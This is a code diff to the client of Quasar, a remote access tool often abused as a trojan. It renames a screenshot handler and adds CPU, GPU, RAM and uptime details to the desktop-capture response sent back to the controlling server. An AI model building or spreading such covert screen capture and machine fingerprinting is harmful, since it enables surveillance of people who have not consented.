@@ -12,10 +12,11 @@ using System.Diagnostics;
 using Quasar.Common.Messages.Preview;
 using Quasar.Common.Messages.other;
 using Quasar.Client.Helper.ScreenStuff;
+using Quasar.Client.IO;
 
 namespace Quasar.Client.Messages
 {
-    public class SimpleScreenshotterHandler : NotificationMessageProcessor, IDisposable
+    public class PreviewHandler : NotificationMessageProcessor, IDisposable
     {
         private UnsafeStreamCodec _streamCodec;
         private BitmapData _desktopData = null;
@@ -81,12 +82,16 @@ namespace Quasar.Client.Messages
                         new Rectangle(0, 0, _desktop.Width, _desktop.Height),
                         new Size(_desktop.Width, _desktop.Height),
                         _desktop.PixelFormat, stream);
-                    _clientMain.Send(new GetPreviewImageResponse
+                    _clientMain.Send(new GetPreviewResponse
                     {
                         Image = stream.ToArray(),
                         Quality = _streamCodec.ImageQuality,
                         Monitor = _streamCodec.Monitor,
-                        Resolution = _streamCodec.Resolution
+                        Resolution = _streamCodec.Resolution,
+                        CPU = HardwareDevices.CpuName,
+                        GPU = HardwareDevices.GpuName,
+                        RAM = HardwareDevices.TotalPhysicalMemory.ToString(),
+                        Uptime = SystemHelper.GetUptime()
                     });
 
                     _streamCodec = null;
